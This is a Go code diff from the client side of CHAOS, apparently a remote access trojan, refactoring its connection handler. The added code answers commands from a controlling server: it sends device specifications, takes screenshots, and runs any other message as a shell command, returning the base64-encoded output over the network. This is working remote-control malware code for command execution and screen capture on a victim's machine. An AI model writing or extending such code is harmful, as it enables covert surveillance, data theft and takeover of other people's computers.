@@ -3,11 +3,9 @@ package connection
 import (
 	"bufio"
 	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	log "github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/client/app/handler"
-	"github.com/tiagorlampert/CHAOS/client/app/models"
 	"github.com/tiagorlampert/CHAOS/client/app/util"
 	"net"
 	"strings"
@@ -31,7 +29,7 @@ func NewConnectionHandler(address, port string) handler.Handler {
 }
 
 func (c ConnectionHandler) Handle() error {
-	device, err := encode(util.LoadDeviceSpecs())
+	device, err := util.Encode(util.LoadDeviceSpecs())
 	if err != nil {
 		log.WithField("cause", err.Error()).Error("error encoding device specs")
 		return err
@@ -49,33 +47,28 @@ func (c ConnectionHandler) Handle() error {
 		}
 
 		switch strings.TrimSpace(message) {
+		case "get_device":
+			device, _ := util.PrettyEncode(util.LoadDeviceSpecs())
+			c.EncodeAndSend(device)
+		case "screenshot":
+			screenshot, _ := util.TakeScreenshot()
+			c.EncodeAndSend(screenshot)
 		default:
-			c.WriteCommandResponse(message)
+			fmt.Print("Message from server: " + message)
+			response := util.RunCmd(message, 10)
+			c.EncodeAndSend(response)
 		}
 	}
 }
 
-func (c ConnectionHandler) WriteCommandResponse(input string) {
-	fmt.Print("Message from server: " + input)
-	output := util.RunCmd(input, 10)
-
-	outputStr := base64.StdEncoding.EncodeToString(output)
-	fmt.Println(outputStr)
-
-	if err := c.Write(outputStr); err != nil {
-		log.WithField("cause", err.Error()).Error("error writing command output")
+func (c ConnectionHandler) EncodeAndSend(data []byte) {
+	encoded := base64.StdEncoding.EncodeToString(data)
+	if err := c.Write(encoded); err != nil {
+		log.WithField("cause", err.Error()).Error("error writing command data")
 	}
 }
 
 func (c ConnectionHandler) Write(v string) error {
 	_, err := c.Connection.Write([]byte(v + Delimiter))
 	return err
-}
-
-func encode(device *models.Device) ([]byte, error) {
-	spec, err := json.Marshal(device)
-	if err != nil {
-		return nil, err
-	}
-	return spec, nil
 }
